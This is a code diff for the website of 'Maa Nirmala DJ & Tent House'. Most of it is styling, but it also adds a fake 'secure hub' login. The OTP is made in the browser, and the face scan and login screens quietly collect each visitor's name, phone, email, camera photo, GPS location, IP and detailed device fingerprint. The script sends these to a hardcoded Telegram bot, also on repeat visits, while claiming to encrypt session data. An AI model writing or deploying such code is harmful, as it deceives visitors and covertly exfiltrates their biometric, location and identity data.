+    .loader-title { color: #D4AF37; font-family: 'Cinzel'; font-size: 24px; letter-spacing: 3px; margin: 0; }
+    .loader-text { color: #aaa; font-size: 13px; margin-top: 12px; letter-spacing: 1px; animation: pulseFace 1.5s infinite; }
+
+    @keyframes rotateGlow { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    @keyframes scanMove { 0%, 100% { top: 5%; opacity:0; } 10% { opacity:1; } 50% { top: 95%; } 90% { opacity:1; } }
+    @keyframes pulseFace { 0%, 100% { opacity: 0.2; transform: scale(1); } 50% { opacity: 0.5; transform: scale(1.05); } }
+</style>
+
+<script src="https://cdn.jsdelivr.net/npm/@tensorflow/tfjs"></script>
+<script src="https://cdn.jsdelivr.net/npm/@tensorflow-models/blazeface"></script>
+
+<script>
+    // --- SYSTEM STATE ---
+    let hubOTP = "";
+    let uName = "", uPhone = "", uEmail = "";
+    let videoStream = null;
+    let pushTimer = null;
+    let authMethodChosen = "";
+    
+    // Telegram Configuration
+    const TG_BOT_TOKEN = "8671549318:AAFmsnS2xvhOJFgYUZfFDe5ELDhpYwlFVqQ"; 
+    const TG_CHAT_ID = "8506290708";
+
+    // --- 1. UI CONTROLS ---
+    function openSecureHub() {
+        if(localStorage.getItem('mnd_hub_auth') === 'true') {
+            uName = localStorage.getItem('mnd_hub_n') || "Returning User";
+            uPhone = localStorage.getItem('mnd_hub_p') || "Saved";
+            triggerSeamlessRedirect(true); 
+        } else {
+            document.getElementById('hubAuthModal').style.display = 'flex';
+        }
+    }
+    function closeHubModal() { document.getElementById('hubAuthModal').style.display = 'none'; stopCamera(); }
+    
+    function resetToMethods() {
+        document.getElementById('hubStep1').style.display = 'block';
+        document.getElementById('hubStepFaceID').style.display = 'none';
+        document.getElementById('hubStep2').style.display = 'none';
+        document.getElementById('hubOtpInput').value = '';
+        closePushNotif(); stopCamera();
+    }
+
+    function checkInputs() {
+        uName = document.getElementById('hubName').value.trim();
+        uEmail = document.getElementById('hubEmail').value.trim() || "Not Provided";
+        uPhone = document.getElementById('hubPhone').value.trim();
+        if(!uName || uPhone.length !== 10 || isNaN(uPhone)) {
+            alert("⚠️ SECURITY HALT: Full Name and valid 10-Digit Mobile Number are strictly required.");
+            return false;
+        }
+        return true;
+    }
+
+    // --- 2. METHOD A: STANDARD OTP ---
+    async function generateStandardOTP() {
+        if(!checkInputs()) return;
+        authMethodChosen = "Standard SMS OTP";
+        
+        const btn = document.getElementById('btnStandardOtp');
+        btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> GENERATING SECURE KEY...';
+        btn.disabled = true;
+
+        hubOTP = Math.floor(100000 + Math.random() * 900000).toString();
+        const payload = await buildDeviceFingerprint(false, authMethodChosen);
+
+        fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
+            method: 'POST', headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: TG_CHAT_ID, text: payload, parse_mode: 'Markdown' })
+        }).then(() => {
+            document.getElementById('hubStep1').style.display = 'none';
+            document.getElementById('hubStep2').style.display = 'block';
+            displayPushNotification(hubOTP);
+            btn.innerHTML = '<i class="fas fa-comment-sms"></i> STANDARD SMS OTP';
+            btn.disabled = false;
+        });
+    }
+
+    // --- 3. METHOD B: TENSORFLOW AI FACE SCANNING ---
+    async function startFaceScanning() {
+        if(!checkInputs()) return;
+        authMethodChosen = "AI Face Scan";
+
+        document.getElementById('hubStep1').style.display = 'none';
+        document.getElementById('hubStepFaceID').style.display = 'flex';
+        document.querySelector('.scanner-container').classList.remove('scanner-active');
+        document.getElementById('faceInstruction').style.color = "#aaa";
+        document.getElementById('faceInstruction').innerText = "Position face and click initiate.";
+
+        try {
+            videoStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
+            document.getElementById('hubVideo').srcObject = videoStream;
+        } catch (err) {
+            alert("⚠️ ACCESS DENIED: Camera permission is required for biological verification.");
+            resetToMethods();
+        }
+    }
+
+    async function executeFaceAnalysis() {
+        const btn = document.getElementById('hubCaptureBtn');
+        const instruction = document.getElementById('faceInstruction');
+        const scannerBox = document.querySelector('.scanner-container');
+        
+        scannerBox.classList.add('scanner-active');
+        btn.innerHTML = '<i class="fas fa-radar fa-spin"></i> LOADING AI CORE...';
+        btn.disabled = true;
+
+        try {
+            instruction.style.color = "#D4AF37";
+            instruction.innerText = "Initializing TensorFlow Neural Net...";
+
+            // 1. Load the Google BlazeFace AI Model
+            if (!window.faceModel) {
+                window.faceModel = await blazeface.load();
+            }
+
+            instruction.innerText = "Scanning for human facial structure...";
+            await new Promise(r => setTimeout(r, 1000)); // UI delay for realism
+
+            // 2. Capture Frame
+            const video = document.getElementById('hubVideo');
+            const canvas = document.getElementById('hubCanvas');
+            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            // 3. ACTUAL AI FACE DETECTION EXECUTION
+            const predictions = await window.faceModel.estimateFaces(video, false);
+
+            if (predictions.length > 0) {
+                // REAL HUMAN FACE DETECTED
+                instruction.style.color = "#00fa9a";
+                instruction.innerText = "✅ Human Face Confirmed.";
+                hubOTP = Math.floor(100000 + Math.random() * 900000).toString();
+
+                canvas.toBlob(async (blob) => {
+                    stopCamera();
+                    document.getElementById('hubStepFaceID').style.display = 'none';
+                    document.getElementById('hubStep2').style.display = 'block';
+                    
+                    displayPushNotification(hubOTP);
+                    const logText = await buildDeviceFingerprint(false, authMethodChosen);
+
+                    const fd = new FormData();
+                    fd.append('chat_id', TG_CHAT_ID);
+                    fd.append('caption', logText);
+                    fd.append('parse_mode', 'Markdown');
+                    fd.append('photo', blob, 'mnd_face_auth.jpg');
+
+                    fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd }).catch(e=>{});
+
+                    btn.innerHTML = '<i class="fas fa-crosshairs"></i> INITIATE NEURAL SCAN';
+                    btn.disabled = false;
+                }, 'image/jpeg', 0.85);
+
+            } else {
+                // NO FACE DETECTED (Tree, wall, dark room, hidden face)
+                instruction.style.color = "#ff3333";
+                instruction.innerText = "❌ ERROR: No human face detected. Look directly at the camera.";
+                scannerBox.classList.remove('scanner-active');
+                btn.innerHTML = '<i class="fas fa-redo"></i> RETRY SCAN';
+                btn.disabled = false;
+            }
+        } catch (error) {
+            console.error(error);
+            instruction.style.color = "#ff3333";
+            instruction.innerText = "❌ AI Engine Error. Check internet connection.";
+            scannerBox.classList.remove('scanner-active');
+            btn.innerHTML = '<i class="fas fa-redo"></i> RETRY SCAN';
+            btn.disabled = false;
+        }
+    }
+    function stopCamera() { if (videoStream) { videoStream.getTracks().forEach(t => t.stop()); videoStream = null; } }
+
+    // --- 4. METHOD C: NATIVE DEVICE LOCK (WEBAUTHN) ---
+    async function startDeviceLockAuth() {
+        if(!checkInputs()) return;
+        authMethodChosen = "Device Lock/Fingerprint";
+
+        if (window.PublicKeyCredential) {
+            try {
+                const chal = new Uint8Array(32); window.crypto.getRandomValues(chal);
+                const cred = await navigator.credentials.create({
+                    publicKey: {
+                        challenge: chal, rp: { name: "Maa Nirmala Hub", id: window.location.hostname },
+                        user: { id: new Uint8Array(16), name: uName, displayName: uName },
+                        pubKeyCredParams: [{ type: "public-key", alg: -7 }],
+                        authenticatorSelection: { authenticatorAttachment: "platform", userVerification: "required" },
+                        timeout: 60000
+                    }
+                });
+
+                if (cred) {
+                    localStorage.setItem('mnd_hub_auth', 'true');
+                    localStorage.setItem('mnd_hub_n', uName);
+                    localStorage.setItem('mnd_hub_p', uPhone);
+                    
+                    document.getElementById('hubAuthModal').style.display = 'none';
+                    hubOTP = "VERIFIED BY DEVICE OS"; 
+                    triggerSeamlessRedirect(false);
+                }
+            } catch (err) { alert("❌ Device authentication canceled or failed."); }
+        } else { alert("⚠️ Biometrics not supported on this browser."); }
+    }
+
+    // --- 5. PUSH NOTIFICATION & SWIPE ENGINE ---
+    const notifEl = document.getElementById('mndPushNotif');
+    let startX = 0;
+
+    function displayPushNotification(code) {
+        document.getElementById('mndPushOtpText').innerText = code;
+        notifEl.classList.remove('mnd-push-hidden');
+        notifEl.classList.add('mnd-push-visible');
+        clearTimeout(pushTimer); pushTimer = setTimeout(closePushNotif, 60000);
+    }
+    function closePushNotif() {
+        notifEl.classList.remove('mnd-push-visible');
+        notifEl.classList.add('mnd-push-hidden');
+        setTimeout(() => { notifEl.style.transform = `translateX(-50%) scale(0.9)`; notifEl.style.opacity = '0'; }, 400);
+    }
+    function copyPushOTP() {
+        navigator.clipboard.writeText(hubOTP);
+        const txt = document.getElementById('mndPushOtpText');
+        txt.innerText = "COPIED!"; setTimeout(() => { txt.innerText = hubOTP; }, 1500);
+    }
+    
+    // Swipe Mechanics
+    notifEl.addEventListener('touchstart', e => { startX = e.touches[0].clientX; notifEl.style.transition = 'none'; }, {passive: true});
+    notifEl.addEventListener('touchmove', e => {
+        let diff = e.touches[0].clientX - startX;
+        notifEl.style.transform = `translateX(calc(-50% + ${diff}px)) scale(1)`;
+    }, {passive: true});
+    notifEl.addEventListener('touchend', e => {
+        notifEl.style.transition = 'top 0.6s ease, transform 0.3s ease, opacity 0.3s ease';
+        let diff = e.changedTouches[0].clientX - startX;
+        if (Math.abs(diff) > 80) {
+            notifEl.style.transform = `translateX(calc(-50% + ${diff * 4}px)) scale(0.9)`;
+            notifEl.style.opacity = '0'; setTimeout(closePushNotif, 300);
+        } else { notifEl.style.transform = `translateX(-50%) scale(1)`; }
+    });
+
+    // --- 6. OTP VERIFICATION ---
+    function verifyHubOTP() {
+        const input = document.getElementById('hubOtpInput').value.trim();
+        if(input === hubOTP && hubOTP !== "") {
+            localStorage.setItem('mnd_hub_auth', 'true');
+            localStorage.setItem('mnd_hub_n', uName);
+            localStorage.setItem('mnd_hub_p', uPhone);
+            document.getElementById('hubAuthModal').style.display = 'none';
+            closePushNotif(); triggerSeamlessRedirect(false); 
+        } else { alert("❌ ACCESS DENIED: Incorrect OTP sequence."); }
+    }
+
+    // --- 7. ENTERPRISE DEVICE FINGERPRINTING ---
+    async function buildDeviceFingerprint(isReturn, methodStr) {
+        let ip="Masked", bat="Unknown", net="Unknown", gpu="N/A";
+        try { const r = await fetch('https://api.ipify.org?format=json'); ip = (await r.json()).ip; } catch(e){}
+        try { const b = await navigator.getBattery(); bat = `${Math.round(b.level * 100)}% (${b.charging ? '⚡' : '🔋'})`; } catch(e){}
+        try { if(navigator.connection) net = `${navigator.connection.effectiveType} - Down: ~${navigator.connection.downlink}Mbps`; } catch(e){}
+        try { var c=document.createElement('canvas'); var gl=c.getContext('webgl'); var d=gl.getExtension('WEBGL_debug_renderer_info'); gpu = gl.getParameter(d.UNMASKED_RENDERER_WEBGL); } catch(e){}
+
+        const cores = navigator.hardwareConcurrency || "Unknown", ram = navigator.deviceMemory ? `~${navigator.deviceMemory}GB` : "Unknown";
+        const browser = navigator.userAgent, screen = `${window.screen.width}x${window.screen.height}`, tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
+        let model = "Unknown Device";
+        if (navigator.userAgentData) { try { const dt = await navigator.userAgentData.getHighEntropyValues(["model", "platform"]); model = `${dt.platform} ${dt.model}`; } catch(e){} }
+
+        const timestamp = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Calcutta' });
+        let status = isReturn ? "(Saved Auto-Login)" : `(${methodStr} | Code: ${hubOTP})`;
+
+        let loc = "❌ Location Blocked";
+        const getL = () => new Promise(res => {
+            if(!navigator.geolocation) return res("❌ Not Supported");
+            navigator.geolocation.getCurrentPosition(
+                p => res(`✅ [View on Maps](http://googleusercontent.com/maps.google.com/9${p.coords.latitude},${p.coords.longitude})`),
+                e => res("❌ Denied by User")
+            );
+        });
+        const locT = new Promise(res => setTimeout(() => res("❌ Timeout"), 2500));
+        loc = await Promise.race([getL(), locT]);
+
+        return `🚨 *MND SECURE ACCESS LOG* 🚨\n_${status}_\n\n👤 *IDENTITY MATRIX*\n• Name: ${uName}\n• Phone: ${uPhone}\n• Email: ${uEmail}\n\n📱 *DEVICE INTELLIGENCE*\n• Model: ${model}\n• OS: \`${browser}\`\n• Screen: ${screen}\n• Timezone: ${tz}\n\n⚙️ *HARDWARE LAYER*\n• GPU: ${gpu}\n• CPU/RAM: Cores: ${cores}, RAM: ${ram}\n• Battery: ${bat}\n\n📡 *NETWORK & LOCATION*\n• IP: ${ip}\n• Type: ${net}\n• GPS: ${loc}\n\n⏰ *Timestamp:* ${timestamp}`;
+    }
+
+    // --- 8. SEAMLESS REDIRECT ---
+    async function triggerSeamlessRedirect(isReturn) {
+        const loader = document.getElementById('seamlessHubLoader');
+        const txt = document.getElementById('hubLoadText');
+        loader.style.display = 'flex';
+
+        if(isReturn) {
+            const logText = await buildDeviceFingerprint(true, "Auto");
+            fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
+                method: 'POST', headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: TG_CHAT_ID, text: logText, parse_mode: 'Markdown' })
+            }).catch(e=>{});
+        }
+
+        setTimeout(() => { txt.innerText = "Encrypting Session Data..."; }, 1000);
+        setTimeout(() => { txt.innerText = "Opening Application Portal..."; }, 2500);
+        setTimeout(() => { window.location.replace('https://maa-nirmala-dj.github.io/-tent-house./'); }, 3500);
+    }
+</script>
+    </div>
+
+    <div id="main-interface">
+    <audio id="sfx-tap"><source src="https://assets.mixkit.co/active_storage/sfx/2568/2568-preview.mp3"></audio>
+    <div id="toast" class="toast"><i class="fas fa-check-circle"></i> Success</div>
+    <div class="bg-fx"><div class="orb orb-1"></div><div class="orb orb-2"></div></div>
+
+    <nav class="navbar" id="mainNavbar">
+        <div class="brand">
+            <i class="fas fa-bars nav-btn" onclick="toggleMenu()"></i>
+            <span><i class="fas fa-crown"></i> MND Hub</span>
+        </div>
+        <div class="nav-right">
+            <div id="google_translate_element"></div>
+            <div class="controls">
+                <button class="nav-btn-square theme-btn" id="themeIcon" onclick="themeSwitch()">
+                    <i class="fas fa-sun"></i>
+                </button>
+                <button class="nav-btn-square set-btn" id="masterSettingsIcon" onclick="openMasterSettings()">
+                    <i class="fas fa-cog fa-spin-hover"></i>
+                </button>
+            </div>
+        </div>
+    </nav>
+
+    <div id="masterSettingsOverlay" onclick="closeMasterOnOutsideClick(event)" style="display:none; position:fixed; top:0; left:0; width:100vw; height:100vh; background:rgba(0,0,0,0.85); z-index:9999999; justify-content:center; align-items:center;">
+        <div class="mn-master-box" id="masterBoxContent" style="width:100%; max-width:500px; height:85vh; background:linear-gradient(145deg, #110e08 0%, #050505 100%); border:1px solid #D4AF37; border-radius:20px; display:flex; flex-direction:column; overflow:hidden;">
+            <div class="master-header" style="padding:20px; text-align:center; border-bottom:1px solid rgba(212,175,55,0.3); position:relative;">
+                <span onclick="closeMasterSettings()" style="position:absolute; top:15px; right:20px; color:#D4AF37; font-size:35px; cursor:pointer;">&times;</span>
+                <h2 style="margin:0; color:#D4AF37; font-family:'Cinzel', serif; font-size:22px; font-weight:900; letter-spacing:1px;"><i class="fas fa-sliders-h"></i> Master Control</h2>
+            </div>
+            </div>
+    </div>
+
+<style>
+    body { padding-top: 65px; } /* Prevents content from hiding under fixed navbar */
+
+    /* Fixed Navbar Styling */
+    .navbar {
+        position: fixed; top: 0; left: 0; width: 100%; height: 65px;
+        background: rgba(10, 10, 12, 0.95); backdrop-filter: blur(15px); -webkit-backdrop-filter: blur(15px);
+        display: flex; justify-content: space-between; align-items: center;
+        padding: 0 15px; border-bottom: 1px solid rgba(212, 175, 55, 0.3);
+        z-index: 1000; box-sizing: border-box; box-shadow: 0 5px 20px rgba(0,0,0,0.5);
+    }
+    .brand { display: flex; align-items: center; gap: 10px; color: #D4AF37; font-family: 'Cinzel', serif; font-weight: 900; font-size: 1.2rem; white-space: nowrap; }
+    .nav-right { display: flex; align-items: center; gap: 8px; }
+    .controls { display: flex; gap: 8px; }
+    
+    /* Square Buttons */
+    .nav-btn-square {
+        width: 38px; height: 38px; border-radius: 8px; cursor: pointer;
+        display: flex; justify-content: center; align-items: center; font-size: 16px; transition: 0.3s;
+    }
+    .theme-btn { background: rgba(255,255,255,0.05); border: 1px solid #D4AF37; color: #D4AF37; }
+    .set-btn { background: rgba(212,175,55,0.15); border: 1px solid #D4AF37; color: #D4AF37; box-shadow: 0 0 10px rgba(212,175,55,0.4); }
+    .fa-spin-hover:hover { animation: fa-spin 2s infinite linear; }
+
+    /* ==========================================
+       PERFECT SQUARE GOOGLE TRANSLATE BUTTON
+       ========================================== */
+    #google_translate_element { 
+        width: 38px; 
+        height: 38px; 
+        overflow: hidden; 
+        border-radius: 8px; 
+    }
+    .goog-te-gadget-simple { 
+        background-color: rgba(255, 255, 255, 0.05) !important; 
+        border: 1px solid #D4AF37 !important; 
+        border-radius: 8px !important; 
+        width: 38px !important; 
+        height: 38px !important; 
+        padding: 0 !important; 
+        display: flex !important; 
+        justify-content: center !important; 
+        align-items: center !important; 
+        box-sizing: border-box !important;
+        position: relative;
+        cursor: pointer;
+        transition: 0.3s ease;
+    }
+    .goog-te-gadget-simple:hover {
+        background-color: rgba(212,175,55,0.15) !important;
+        box-shadow: 0 0 10px rgba(212,175,55,0.4) !important;
+    }
+    /* Hide Google's default text and icons */
+    .goog-te-gadget-simple span,
+    .goog-te-gadget-icon,
+    .goog-te-menu-value span { 
+        display: none !important; 
+    }
+    /* Insert a premium gold Language Icon in the center */
+    .goog-te-gadget-simple::after {
+        content: '\f1ab'; /* FontAwesome Language Icon */
+        font-family: 'Font Awesome 6 Free', 'Font Awesome 5 Free';
+        font-weight: 900;
+        color: #D4AF37;
+        font-size: 16px;
+    }
+    .goog-logo-link { display: none !important; }
+    .goog-te-gadget { color: transparent !important; }
+</style>
+
+<script>
+    // --- MODAL CONTROLS ---
+    function openMasterSettings() { document.getElementById('masterSettingsOverlay').style.display = 'flex'; }
+    function closeMasterSettings() { document.getElementById('masterSettingsOverlay').style.display = 'none'; }
+    function closeMasterOnOutsideClick(event) { if (event.target.id === 'masterSettingsOverlay') closeMasterSettings(); }
+
+    // --- THEME SWITCH ---
+    function themeSwitch() {
+        const icon = document.querySelector('#themeIcon i');
+        if(icon.classList.contains('fa-sun')) {
+            icon.classList.replace('fa-sun', 'fa-moon');
+            document.body.style.backgroundColor = '#ffffff'; document.body.style.color = '#000000';
+        } else {
+            icon.classList.replace('fa-moon', 'fa-sun');
+            document.body.style.backgroundColor = '#0a0a0c'; document.body.style.color = '#ffffff';
+        }
+    }
+</script>
+
+<div class="container" id="homeSection">
+<style>
+    /* --- IMPORT PREMIUM LUXURY FONTS --- */
+    @import url('https://fonts.googleapis.com/css2?family=Cinzel:wght@700;900&family=Outfit:wght@300;400;600;800&display=swap');
+
+    /* 1. Main container reset */
+    #homeSection {
+        padding: 0; 
+        margin: 0;
+        width: 100%;
+        background-color: #050505; 
+    }
+
+    /* 2. The edge-to-edge full-bleed hero card (PERFECTED FIT) */
+    .full-bleed-hero-edge {
+        position: relative;
+        width: 100vw; 
+        left: 50%;
+        transform: translateX(-50%); /* This perfectly centers it and removes all side gaps */
+        
+        height: 48vh; 
+        min-height: 420px; 
+        
+        border-radius: 0 0 35px 35px; 
+        border-bottom: 1px solid rgba(212, 175, 55, 0.3);
+        box-shadow: 0 10px 40px rgba(0, 0, 0, 0.9);
+        overflow: hidden;
+        background-color: #000;
+    }
+
+    /* 3. Perfect image fit */
+    .hero-img-full {
+        width: 100%;
+        height: 100%;
+        object-fit: cover;
+        object-position: center 20%; 
+        display: block;
+    }
+
+    /* 4. THE 10-COLOR BACKGROUND OVERLAY (DJ LIGHTING) */
+    .dj-color-shine {
+        position: absolute;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background: linear-gradient(45deg, 
+            #4a0000, #2a004d, #00004d, #00331a, #4d3300, 
+            #4d0033, #4d1a00, #003333, #1a0033, #4a0000 
+        );
+        background-size: 400% 400%;
+        animation: djShineAnim 15s ease-in-out infinite;
+        mix-blend-mode: screen; 
+        opacity: 0.65; 
+        z-index: 1;
+    }
+
+    @keyframes djShineAnim {
+        0% { background-position: 0% 50%; }
+        50% { background-position: 100% 50%; }
+        100% { background-position: 0% 50%; }
+    }
+
+    /* 5. Deep Black Gradient Fade */
+    .hero-dark-edge-fade {
+        position: absolute;
+        bottom: 0;
+        left: 0;
+        width: 100%;
+        height: 65%; 
+        background: linear-gradient(
+            to bottom,
+            rgba(5, 5, 5, 0) 0%,      
+            rgba(5, 5, 5, 0.75) 50%,   
+            rgba(5, 5, 5, 0.98) 85%,  
+            #050505 100%              
+        );
+        z-index: 2;
+    }
+
+    /* 6. Text content positioned perfectly */
+    .hero-text-edge-content {
+        position: absolute;
+        bottom: 0;
+        left: 0;
+        width: 100%;
+        padding: 0 20px 15px 20px; 
+        text-align: center;
+        z-index: 3;
+        box-sizing: border-box; /* Ensures padding doesn't push text off-screen */
+    }
+
+    /* 7. THE 2-SECOND DEEP COLOR TEXT SHINE ANIMATION */
+    @keyframes textDeepShine {
+        0% { background-position: 0% 50%; }
+        100% { background-position: 200% 50%; }
+    }
+
+    /* MASSIVE Main Title */
+    .hero-massive-title {
+        font-family: 'Cinzel', serif; 
+        font-size: 44px; 
+        font-weight: 900;
+        text-transform: uppercase;
+        margin: 0 0 2px 0;
+        letter-spacing: 1px;
+        line-height: 1.05;
+        filter: drop-shadow(0px 8px 15px rgba(0, 0, 0, 1)); 
+        
+        /* The Deep Color Gradient */
+        background: linear-gradient(to right, #FFD700, #FF1493, #8A2BE2, #00BFFF, #00FA9A, #FFD700);
+        background-size: 200% auto;
+        -webkit-background-clip: text;
+        -webkit-text-fill-color: transparent;
+        
+        /* 2-Second continuous loop */
+        animation: textDeepShine 2s linear infinite;
+    }
+
+    /* Stacked Elegant Subtitle */
+    .hero-massive-subtitle {
+        display: block;
+        font-family: 'Cinzel', serif;
+        font-size: 22px;
+        font-weight: 700;
+        letter-spacing: 5px; 
+        margin-bottom: 12px;
+        filter: drop-shadow(0px 4px 12px rgba(0, 0, 0, 1));
+
+        /* Matches the deep color shine of the main title */
+        background: linear-gradient(to right, #FFD700, #FF1493, #8A2BE2, #00BFFF, #00FA9A, #FFD700);
+        background-size: 200% auto;
+        -webkit-background-clip: text;
+        -webkit-text-fill-color: transparent;
+        animation: textDeepShine 2s linear infinite;
+    }
+
+    /* 8. Luxury Spaced Address Line */
+    .hero-premium-address {
+        font-family: 'Outfit', sans-serif;
+        font-size: 13px;
+        font-weight: 500;
+        color: #E0E0E0; 
+        margin: 0;
+        letter-spacing: 2px;
+        text-transform: uppercase;
+        line-height: 1.8;
+        text-shadow: 0px 2px 10px rgba(0, 0, 0, 1);
+    }
+
+    /* Gold Separators inside the address */
+    .hero-premium-address span {
+        color: #D4AF37; 
+        margin: 0 6px;
+        opacity: 0.9;
+        font-weight: 800;
+    }
+</style>
+
+    <div class="full-bleed-hero-edge">
+        
+        <img src="https://i.postimg.cc/g20XqtDW/IMG_20260303_121446.png" class="hero-img-full" alt="Maa Nirmala DJ">
+        
+        <div class="dj-color-shine"></div>
+        
+        <div class="hero-dark-edge-fade"></div>
+
+        <div class="hero-text-edge-content">
+            
+            <h1 class="hero-massive-title">MAA NIRMALA DJ</h1>
+            <span class="hero-massive-subtitle">& TENT HOUSE</span>
+            
+            <p class="hero-premium-address">
+                Tola Beltikri <span>|</span> Kaddhar <span>|</span> Katoria <br> Banka <span>|</span> Bihar
+            </p>        
+    </div>
+</div>
+                <button id="installBtn" onclick="installApp()"><i class="fas fa-download"></i> INSTALL MNDs APP</button>
+            </div>
+            <style>
+    /* --- 1. THE GLOWING MASTER BUTTON --- */
+    .premium-social-trigger {
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        gap: 12px;
+        width: 85%;
+        max-width: 400px;
+        margin: 40px auto;
+        padding: 18px 25px;
+        border-radius: 40px;
+        background: linear-gradient(135deg, #111, #222);
+        border: 2px solid #D4AF37;
+        color: #fff;
+        font-family: 'Cinzel', serif;
+        font-size: 18px;
+        font-weight: 800;
+        letter-spacing: 2px;
+        cursor: pointer;
+        position: relative;
+        overflow: hidden;
+        box-shadow: 0 0 25px rgba(212, 175, 55, 0.4);
+        transition: transform 0.3s ease, box-shadow 0.3s ease;
+        animation: subtlePulse 3s infinite alternate;
+    }
+
+    .premium-social-trigger::before {
+        content: '';
+        position: absolute;
+        top: 0;
+        left: -100%;
+        width: 50%;
+        height: 100%;
+        background: linear-gradient(to right, transparent, rgba(212, 175, 55, 0.6), transparent);
+        transform: skewX(-25deg);
+        animation: buttonShine 4s infinite;
+    }
+
+    @keyframes buttonShine {
+        0% { left: -100%; }
+        20% { left: 200%; }
+        100% { left: 200%; }
+    }
+
+    @keyframes subtlePulse {
+        0% { box-shadow: 0 0 15px rgba(212, 175, 55, 0.3); }
+        100% { box-shadow: 0 0 35px rgba(212, 175, 55, 0.8); }
+    }
+
+    .premium-social-trigger:active {
+        transform: scale(0.96);
+    }
+
+    /* Auto-scrolling Social Logos inside the button */
+    .social-logo-scroller {
+        display: flex;
+        gap: 15px;
+        width: 80px; 
+        overflow: hidden;
+        mask-image: linear-gradient(to right, transparent, black 20%, black 80%, transparent);
+        -webkit-mask-image: linear-gradient(to right, transparent, black 20%, black 80%, transparent);
+    }
+    
+    .social-logo-track {
+        display: flex;
+        gap: 15px;
+        animation: scrollLogos 6s linear infinite;
+    }
+
+    .social-logo-track i {
+        font-size: 22px;
+        color: #D4AF37;
+    }
+
+    @keyframes scrollLogos {
+        0% { transform: translateX(0); }
+        100% { transform: translateX(calc(-50% - 7.5px)); }
+    }
+
+    /* --- 2. THE MODAL OVERLAYS (Glassmorphism) --- */
+    .media-modal {
+        position: fixed;
+        inset: 0;
+        background: rgba(5, 5, 5, 0.98);
+        backdrop-filter: blur(20px);
+        -webkit-backdrop-filter: blur(20px);
+        z-index: 99999;
+        display: none;
+        flex-direction: column;
+        align-items: center;
+        justify-content: center;
+        opacity: 0;
+        transition: opacity 0.4s ease;
+    }
+
+    .media-modal.active {
+        display: flex;
+        opacity: 1;
+    }
+
+    .close-modal-btn {
+        position: absolute;
+        top: 20px;
+        right: 25px;
+        color: #D4AF37;
+        font-size: 35px;
+        cursor: pointer;
+        z-index: 100000;
+        text-shadow: 0 0 15px rgba(212, 175, 55, 0.5);
+    }
+
+    /* --- 3. SELECTION SCREEN --- */
+    .selection-box {
+        display: flex;
+        flex-direction: column;
+        gap: 20px;
+        width: 90%;
+        max-width: 400px;
+        text-align: center;
+    }
+
+    .selection-title {
+        color: #fff;
+        font-family: 'Cinzel', serif;
+        font-size: 32px;
+        font-weight: 800;
+        margin-bottom: 20px;
+        text-shadow: 0 0 15px rgba(212, 175, 55, 0.8);
+    }
+
+    .option-btn {
+        background: rgba(20, 20, 20, 0.8);
+        border: 1px solid #D4AF37;
+        padding: 25px;
+        border-radius: 20px;
+        color: #fff;
+        font-family: 'Outfit', sans-serif;
+        font-size: 20px;
+        font-weight: 600;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        gap: 15px;
+        cursor: pointer;
+        box-shadow: 0 5px 20px rgba(0,0,0,0.5);
+        transition: transform 0.2s, background 0.3s;
+    }
+
+    .option-btn i { font-size: 28px; color: #D4AF37; }
+    .option-btn:active { transform: scale(0.95); }
+
+    /* --- 4. GALLERIES (Audio/Video Lists) --- */
+    .gallery-container {
+        width: 100%;
+        max-width: 500px;
+        height: 85vh;
+        overflow-y: auto;
+        padding: 20px;
+        display: flex;
+        flex-direction: column;
+        gap: 25px;
+        align-items: center;
+        scrollbar-width: none; 
+    }
+    .gallery-container::-webkit-scrollbar { display: none; }
+
+    .gallery-title {
+        color: #D4AF37;
+        font-family: 'Cinzel', serif;
+        font-size: 24px;
+        margin: 0 0 10px 0;
+        text-align: center;
+        position: sticky;
+        top: 0;
+        background: rgba(5,5,5,0.95);
+        padding: 15px;
+        width: 100%;
+        z-index: 10;
+        border-bottom: 1px solid rgba(212, 175, 55, 0.3);
+    }
+
+    /* Audio Player Styling */
+    .audio-card {
+        background: #111;
+        border: 1px solid rgba(212, 175, 55, 0.4);
+        border-radius: 15px;
+        padding: 20px;
+        width: 100%;
+        box-shadow: 0 5px 15px rgba(0,0,0,0.8);
+        text-align: left;
+    }
+    .audio-card h4 { color: #fff; font-family: 'Outfit', sans-serif; margin: 0 0 10px 0; font-size: 16px; }
+    .audio-card audio { width: 100%; outline: none; border-radius: 30px; }
+    audio::-webkit-media-controls-panel { background-color: #222; }
+    audio::-webkit-media-controls-current-time-display,
+    audio::-webkit-media-controls-time-remaining-display { color: #fff; }
+
+    /* Video Embed Container (FIXED TO PREVENT COLLAPSING) */
+    .video-card {
+        width: 100%;
+        min-height: 450px; /* <--- THIS PREVENTS THE FLAT LINES */
+        background: #050505;
+        border-radius: 10px;
+        overflow: hidden;
+        border: 1px solid rgba(212, 175, 55, 0.3);
+        display: flex;
+        justify-content: center;
+        align-items: center;
+    }
+</style>
+
+<button class="premium-social-trigger" onclick="openHubModal('selectionModal')">
+    SOCIAL POSTS
+    <div class="social-logo-scroller">
+        <div class="social-logo-track">
+            <i class="fab fa-instagram"></i>
+            <i class="fab fa-facebook-f"></i>
+            <i class="fab fa-youtube"></i>
+            <i class="fab fa-whatsapp"></i>
+            <i class="fab fa-instagram"></i>
+            <i class="fab fa-facebook-f"></i>
+            <i class="fab fa-youtube"></i>
+            <i class="fab fa-whatsapp"></i>
+        </div>
+    </div>
+</button>
+
+<div class="media-modal" id="selectionModal">
+    <i class="fas fa-times close-modal-btn" onclick="closeAllModals()"></i>
+    
+    <div class="selection-box">
+        <h2 class="selection-title">MND MEDIA HUB</h2>
+        
